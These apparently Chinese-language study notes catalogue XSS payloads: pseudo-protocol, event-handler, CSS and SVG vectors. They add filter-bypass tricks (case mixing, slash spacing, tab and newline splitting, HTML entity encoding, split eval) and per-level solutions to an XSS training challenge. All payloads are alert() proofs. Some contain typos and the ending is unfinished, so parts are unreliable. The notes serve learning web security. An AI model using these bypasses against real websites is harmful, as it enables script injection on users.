xss类型：

```javascript
<script>alter(/xss/)<script>
```

反射型

存储型

DOM型



伪协议：

```javascript
<a href="javascript:alert(/xss/)">haha</a>
```

img在ie6下测试成功

```javascript
<img src="javascript:alert('xss')">
```

事件触发：

```javascript
鼠标悬停
<img src='./smile.jpg' onmouseover='alert(/xss/)'>
点击文本框
<input type="text" onkeydown="alert(/xss)">
<input type="text" onkeyup="alert(/xss)">
<input type="text" onclick="alert(/xss)">
<img src='#' onerror="alert(/xss)">
```

利用CSS跨站（old）:

ie6下测试通过

行内样式

```html
<div style="background-image:url(javascript:alert(/xss/))"
```

页内样式

```css
<style>Body{background-image:url(javascript:alert(/xss/))}</style>
```

外部样式

```
<link rel="stylesheet" type="text/css" href="./xss.css"><div>hello</div>
```

```html
<svg onload="alert(/xss/)">
```

```
<input onfocus=alert(/xss) autofocus>
```



大小写转换

可以将payload进行大小写转化

```html
<Img sRc='#' Onerror="alert(/xss/)" />
<a hRef="javaScript:alert(/xss/)">clike me</a>
```



引号的使用

HTML语言中对引号的使用不敏感，但是某些过滤函数是“锱铢必较”。

```
<img src="#" onerror="alert(/xss/)"/>
<img src='#' onerror='alert(/xss/)'/>
<img src=# onerror=alert(/xss/) />
```

/替代空格

可以利用左斜线替代空格

```
<Img/sRc='#'/Onerror='alert(/xss/)'/>
```



回车

我们可以在一些位置添加Tab和回车符，来绕过关键字检测

```javascript
<Img/sRc='#'/Onerror	='alert(/xss/)'/>
<A hREf="javas
cript:alert(/xss/)">click me</a>
```



对标签属性值进行转码

字母	ASCII码	十进制编码	十六进制编码

a		97				`&#97;`			`&#x61;`

e		101			`&#101;`			'& #x65;'

Tab &#9

换行 &#10

回车 &#13

S0H &#01

STX &#02

```
<A hREf="&#01;j&#97;v&#x61s&#9;c&#10;r&#13;ipt:alert(/xss/)"
```

拆分跨站

```
<script>z='alert'<script>
<script>z=z+'(/xss/)'<script>
<script>eval(z)<script>
```



XSS通关挑战

```javascript
<script script "'OOnn>
```

第一关

```
<script>alert(/xss/)</script>
```

第二关

```
hello"><img onerror='alert (/xss/)'src="#
```

第三关

```
a' onmouseover='alert(/xss/)
```

第四关

```
a" onmouseover="alert(/xss/)
```

第五关

```
"><a href="javascript:alert(/xss/)">click</a>
```

第六关

> 对herf进行了过滤，但是没有对大小写过滤

```
"><a hRef="javascript:alert(/xss/)">click</a>
```

第七关

> 只过滤一次on

```
" oonnmouseover="alert(/xss/)"
```

第八关

```
javas&#x63;ript:alert(/xss/)
```

第九关

```
javas&#x63;ript:alert('http://')
```

第十关

```
?t_sort=aaa" type="button" onclick="javascript:alert(/xss/)
```

第十一关

第二关

第二关

